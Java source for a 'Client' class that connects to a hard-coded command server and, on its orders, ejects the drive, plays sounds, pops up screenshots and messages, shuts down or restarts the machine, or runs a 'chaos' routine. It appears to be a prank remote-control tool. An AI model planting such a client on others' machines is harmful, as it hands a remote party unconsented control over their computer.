import javax.swing.*;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.Socket;

/**
 * the program that runs on each clients machine. The Client class
 * connects to the Server and waits for instructions
 */
public class Client
{
    private static final int SERVER_PORT = 0xbeef;
    private static final String SERVER_IP_ADDRESS = "127.0.0.1";
    private CommandSet commandSet;

    public Client() throws IOException, UnknownOperatingSystemException, AWTException
    {
        commandSet = setCommandSet();
        connectAndListen();
    }

    /**
     * gets the appropriate command set for the OS that the client is running
     * @return the CommandSet that will work on the clients operating system
     * @throws UnknownOperatingSystemException if the operating system is unrecognised
     */
    private CommandSet setCommandSet() throws UnknownOperatingSystemException
    {
        String operatingSystem = System.getProperty("os.name");
        if(operatingSystem.equals("Linux"))
            return new LinuxCommandSet();
        if(operatingSystem.startsWith("Windows"))
            return new WindowsCommandSet();
        if(operatingSystem.startsWith("Mac"))
            return new MacCommandSet();

        throw new UnknownOperatingSystemException("Client OS not Linux, Mac or Windows");
    }

    /**
     * connects to the command server and waits for commands
     * @throws IOException if something went wrong connecting to the command server
     */
    private void connectAndListen() throws IOException, AWTException
    {
        Socket socket = new Socket(SERVER_IP_ADDRESS, SERVER_PORT);
        BufferedReader inFromServer = new BufferedReader(new InputStreamReader(socket.getInputStream()));

        while(socket.isConnected())
        {
            String serverCommand = inFromServer.readLine(); // blocks
            if(serverCommand.equals("sound")) // 1 arg commands
                processServerCommand(serverCommand, inFromServer.readLine());
            else if(serverCommand.equals("chaos")) // 2 arg commands
                processServerCommand(serverCommand, inFromServer.readLine(), inFromServer.readLine());
            else if(serverCommand.equals("msg")) // 4 arg commands
                processServerCommand(serverCommand, inFromServer.readLine(), inFromServer.readLine(), inFromServer.readLine());
            else
                processServerCommand(serverCommand);
            System.out.println("Recivied from server: " + serverCommand);
        }
    }

    /**
     * calls the appropriate method on the CommandSet depending on what the server wants us to do to
     * the client
     * @param serverCommand the command from the server and optionally extra arguments (msg command for example provides a msg arg)
     */
    private void processServerCommand(String... serverCommand) throws IOException, AWTException
    {
        switch(serverCommand[0].toLowerCase())
        {
            case "eject":
                commandSet.eject();
                return;
            case "sound":
                commandSet.playSound();
                return;
            case "screenshot":
                JPanel panel = new JPanel();
                JFrame frame = new JFrame();
                BufferedImage img = commandSet.takeScreenshot();
                JLabel lbl = new JLabel(new ImageIcon(img));
                panel.add(lbl);
                frame.add(panel);
                frame.setSize(Toolkit.getDefaultToolkit().getScreenSize());
                //frame.setResizable(false);
                //frame.setEnabled(false);
                //frame.setAlwaysOnTop(true);
                frame.setTitle("Hello");
                frame.setVisible(true);
                return;
            case "msg":
                commandSet.showMessage(serverCommand[1], serverCommand[2], serverCommand[3]);
                return;
            case "shutdown":
                commandSet.shutdown();
                return;
            case "restart":
                commandSet.restart();
                return;
            case "chaos":
                commandSet.chaos(Long.valueOf(serverCommand[1]), Long.valueOf(serverCommand[2]));
                break;
            default:
                System.out.println("Reached default in processSErverCommand with cmd: " + serverCommand);
        }
    }
}
